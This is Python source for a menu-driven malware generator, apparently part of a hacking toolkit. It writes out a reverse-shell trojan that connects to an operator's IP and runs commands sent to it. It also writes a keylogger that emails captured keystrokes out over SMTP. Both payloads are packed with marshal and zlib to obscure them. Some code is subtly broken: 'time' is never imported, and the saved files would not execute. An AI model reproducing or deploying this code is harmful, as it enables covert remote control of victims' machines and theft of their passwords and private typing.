import os
import base64
import marshal
import zlib
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

def generate_trojan(ip, port):
    trojan_code = f'''import socket, os, subprocess

def connect():
    s = socket.socket()
    s.connect(("{ip}", {port}))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        try:
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        except:
            s.send("[!] Command failed".encode())
    s.close()

if __name__ == "__main__":
    connect()
'''
    return compile(trojan_code, '<string>', 'exec')

def generate_keylogger(email, password):
    keylogger_code = f'''import keyboard
import threading
import smtplib
from datetime import datetime
import os

LOG_FILE = "keylog.txt"
EMAIL_ADDRESS = "{email}"
EMAIL_PASSWORD = "{password}"
SEND_INTERVAL = 60

def on_key(event):
    with open(LOG_FILE, "a") as f:
        f.write(f"{{datetime.now()}} - {{event.name}}\\n")

def send_logs():
    while True:
        time.sleep(SEND_INTERVAL)
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                data = f.read()
            if data:
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, data)
                    server.quit()
                    open(LOG_FILE, "w").close()
                except:
                    pass

threading.Thread(target=send_logs, daemon=True).start()
keyboard.on_press(on_key)
keyboard.wait()
'''
    return compile(keylogger_code, '<string>', 'exec')

def save_malware(code, filename):
    compiled = marshal.dumps(code)
    compressed = zlib.compress(compiled)
    header = b'#!/usr/bin/env python3\n'
    payload = header + compressed
    
    with open(filename, 'wb') as f:
        f.write(payload)
    
    if os.name != 'nt':
        os.chmod(filename, 0o755)
    
    return filename

def malware_generator():
    while True:
        clear_screen()
        print(f"\n{Fore.MAGENTA}{t('malware_menu')}{Style.RESET_ALL}")
        print("01. Create Trojan")
        print("02. Create Keylogger")
        print("03. Create Ransomware (DEMO)")
        print("00. Back")
        choice = input(t("choose"))
        
        if choice == '01':  
            filename = input("> Output filename (trojan.py): ") or "trojan.py"
            ip = input("> Your IP: ")
            port = int(input("> Port (4444): ") or 4444)
            code = generate_trojan(ip, port)
            save_malware(code, filename)
            print(f"{Fore.GREEN}[+] Trojan created: {filename}{Style.RESET_ALL}")
            input(f"\n{t('press_enter')}")
            
        elif choice == '02':  
            filename = input("> Output filename (keylogger.py): ") or "keylogger.py"
            email = input("> Email for logs: ")
            password = input("> Email password: ")
            code = generate_keylogger(email, password)
            save_malware(code, filename)
            print(f"{Fore.GREEN}[+] Keylogger created: {filename}{Style.RESET_ALL}")
            input(f"\n{t('press_enter')}")
            
        elif choice == '03':  
            print(f"{Fore.RED}[!] Ransomware module disabled for security reasons{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}This feature is only available in the full version{Style.RESET_ALL}")
            input(f"\n{t('press_enter')}")
            
        elif choice == '00':
            break
            
        else:
            print(t("error"))
            time.sleep(1)